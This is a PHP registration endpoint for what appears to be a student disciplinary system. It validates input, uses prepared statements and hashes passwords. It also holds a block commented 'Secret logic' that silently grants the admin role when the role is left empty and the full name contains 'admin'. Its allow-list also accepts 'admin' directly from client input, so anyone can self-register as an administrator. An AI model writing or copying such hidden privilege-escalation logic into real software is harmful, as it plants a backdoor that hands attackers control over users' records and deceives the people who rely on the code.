<?php
// register.php - Self-service user registration endpoint
// Expects JSON: { "username": "...", "password": "...", "fullname": "...", "role": "student|lecturer" }

header('Content-Type: application/json; charset=utf-8');
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
error_reporting(E_ALL);

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
        exit;
    }

    $input = json_decode(file_get_contents('php://input'), true);
    if (!is_array($input)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Invalid request']);
        exit;
    }

    $username = trim($input['username'] ?? '');
    $password = $input['password'] ?? '';
    $fullname = trim($input['fullname'] ?? '');
    $role = strtolower(trim($input['role'] ?? ''));

    // Validate input
    if ($username === '' || $password === '' || $fullname === '') {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'All fields are required']);
        exit;
    }

    if (strlen($username) < 3) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Username must be at least 3 characters']);
        exit;
    }

    if (strlen($password) < 6) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Password must be at least 6 characters']);
        exit;
    }

    // Secret logic: if role is empty and fullname contains 'admin', register as admin
    if ($role === '' || $role === 'select account type') {
        if (stripos($fullname, 'admin') !== false) {
            $role = 'admin';
        } else {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Please select an account type']);
            exit;
        }
    }

    // Only allow student, lecturer, or admin registration
    if (!in_array($role, ['student', 'lecturer', 'admin'], true)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Invalid account type']);
        exit;
    }

    // Load config
    if (file_exists(__DIR__ . '/config.php')) {
        require_once __DIR__ . '/config.php';
    }
    if (!isset($mysqli) || !($mysqli instanceof mysqli)) {
        $db_host = defined('DB_HOST') ? DB_HOST : '127.0.0.1';
        $db_user = defined('DB_USER') ? DB_USER : 'root';
        $db_pass = defined('DB_PASS') ? DB_PASS : '';
        $db_name = defined('DB_NAME') ? DB_NAME : 'student_disciplinary_system';
        $mysqli = new mysqli($db_host, $db_user, $db_pass, $db_name);
        if ($mysqli->connect_errno) {
            http_response_code(500);
            echo json_encode(['success' => false, 'message' => 'Database error']);
            exit;
        }
    }
    $mysqli->set_charset('utf8mb4');

    // Check if username already exists
    $stmt = $mysqli->prepare('SELECT UserID FROM users WHERE Username = ? LIMIT 1');
    if (!$stmt) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Database error']);
        exit;
    }
    $stmt->bind_param('s', $username);
    $stmt->execute();
    $res = $stmt->get_result();
    if ($res->num_rows > 0) {
        http_response_code(409);
        echo json_encode(['success' => false, 'message' => 'Username already taken']);
        $stmt->close();
        $mysqli->close();
        exit;
    }
    $stmt->close();

    // Hash password
    $passwordHash = password_hash($password, PASSWORD_DEFAULT);

    // Insert new user
    $stmt = $mysqli->prepare('INSERT INTO users (Username, PasswordHash, FullName, Role) VALUES (?, ?, ?, ?)');
    if (!$stmt) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Database error']);
        exit;
    }
    $stmt->bind_param('ssss', $username, $passwordHash, $fullname, $role);
    if (!$stmt->execute()) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Registration failed']);
        $stmt->close();
        $mysqli->close();
        exit;
    }

    $stmt->close();
    $mysqli->close();

    http_response_code(201);
    echo json_encode([
        'success' => true,
        'message' => 'Account created successfully',
        'role' => $role
    ]);
    exit;

} catch (Throwable $e) {
    error_log('register.php exception: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error']);
    exit;
}
